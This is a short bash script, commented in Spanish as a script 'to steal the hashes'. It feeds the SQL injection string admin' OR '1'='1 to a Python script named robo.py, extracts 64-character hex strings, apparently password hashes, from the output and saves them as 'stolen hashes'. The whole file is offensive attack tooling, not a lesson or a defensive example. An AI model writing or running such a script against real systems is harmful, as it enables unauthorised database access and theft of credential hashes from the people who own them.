#!/bin/bash
set -e
echo "Script para robar los hashes"
entrada="admin' OR '1'='1"
python robo.py "$entrada" | grep -oE '[a-fA-f0-9]{64}' > hashes.txt
cat hashes.txt | tr -d "'" > hashes_robados.txt
rm hashes.txt
